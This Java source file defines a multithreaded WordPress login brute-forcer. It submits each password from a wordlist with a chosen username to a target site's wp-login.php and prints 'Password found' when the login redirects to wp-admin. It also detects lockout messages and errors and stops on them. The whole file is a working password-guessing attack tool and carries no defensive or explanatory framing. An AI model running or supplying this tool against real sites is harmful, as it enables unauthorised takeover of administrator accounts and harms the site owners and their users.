import me.tongfei.progressbar.ProgressBar;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.List;

public class bruteForceWordpress implements Runnable {
    private final String host;
    private final String users;
    private final List<String> wordlist;
   // private final ProgressBar pb;

    bruteForceWordpress(String host, String users, List<String> wordlist) {
        this.host = host;
        this.users = users;
        this.wordlist = wordlist;
       // this.pb = pb;
    }

    @Override
    public void run() {
        //return;
        for (String password : wordlist) {
            try {
                URL url = new URL(host + "/wp-login.php");
                Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("127.0.0.1", 8080));
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
              
                String urlParameters = "log=" + users + "&pwd=" + password + "&wp-submit=Log+In&redirect_to=http%3A%2F%2F" + host + "%2Fwp-admin%2F&testcookie=1";
                byte[] postData = urlParameters.getBytes(StandardCharsets.UTF_8);
                int postDataLength = postData.length;
                connection.usingProxy();
                connection.setDoOutput(true);
                connection.setConnectTimeout(500);
                connection.setInstanceFollowRedirects(true);
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Cookie", "wordpress_test_cookie=WP+Cookie+check");
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                connection.setRequestProperty("charset", "utf-8");

                try (DataOutputStream wr = new DataOutputStream(connection.getOutputStream())) {
                    wr.write(postData);
                }

                connection.connect();

                System.out.println(connection.getResponseCode() + " >> " + connection.getResponseMessage() + " password: " + password);

                if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
                    if (connection.getURL().toString().contains("wp-admin")) {
                        System.out.println("Password found " + password);
                    }

                    try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                        String line;
                        while ((line = bufferedReader.readLine()) != null) {
                            if (line.contains("You have exceeded maximum login retries")) {
                                System.out.println("\nYou have exceeded maximum login retries ");
                                return;
                            }
                            if (line.contains("Database Error")) {
                                System.out.println("\nDatabase error");
                                return;
                            }
                            if(line.contains("404")) {
                                System.out.println("\n404 error");
                                return;

                            }
                            // System.out.println(connection.getResponseCode());
                        }
                    }

                } else {
                    System.out.println("response: " + connection.getResponseMessage());
                }

            } catch (ProtocolException e) {
                e.printStackTrace();
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
           // pb.step();
        }
    }
}
